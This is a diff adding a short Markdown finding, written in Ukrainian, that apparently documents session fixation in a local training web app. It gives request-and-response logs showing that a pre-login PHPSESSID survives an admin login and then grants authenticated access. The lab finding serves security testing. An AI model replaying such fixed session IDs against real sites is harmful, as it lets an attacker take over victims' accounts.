@@ -1,0 +1,26 @@
+# V2. Session fixation
+
+1) Неавтентифікований PHPSESSID=fc754f4650231ff4ce4f716309ceb222
+> GET http://127.0.0.1:4280/login.php
+< HTTP 200
+< Date: Tue, 24 Nov 2026 03:30:45 GMT
+< Set-Cookie: security=low; path=/, PHPSESSID=fc754f4650231ff4ce4f716309ceb222; expires=Wed, 25 Nov 2026 03:30:45 GMT; Max-Age=86400; path=/; domain=127.0.0.1
+
+2) Жертва входить із тим самим ідентифікатором:
+> POST http://127.0.0.1:4280/login.php
+> Cookie: PHPSESSID=fc754f4650231ff4ce4f716309ceb222; security=low
+> Content-Type: application/x-www-form-urlencoded
+> [body] username=admin&password=password&Login=Login&user_token=9913f0283cf30b7cf7236f5235c53166
+< HTTP 302
+< Date: Tue, 24 Nov 2026 03:30:45 GMT
+< Set-Cookie: PHPSESSID=fc754f4650231ff4ce4f716309ceb222; expires=Wed, 25 Nov 2026 03:30:45 GMT; Max-Age=86400; path=/; domain=127.0.0.1
+< Location: index.php
+PHPSESSID після входу: fc754f4650231ff4ce4f716309ceb222 (той самий)
+
+3) Повторне використання початкового ідентифікатора на /index.php:
+> GET http://127.0.0.1:4280/index.php
+> Cookie: PHPSESSID=fc754f4650231ff4ce4f716309ceb222
+< HTTP 200
+< Date: Tue, 24 Nov 2026 03:30:45 GMT
+< Set-Cookie: security=low; path=/, PHPSESSID=fc754f4650231ff4ce4f716309ceb222; expires=Wed, 25 Nov 2026 03:30:45 GMT; Max-Age=86400; path=/; domain=127.0.0.1
+Результат: автентифікована сесія доступна за початковим ідентифікатором
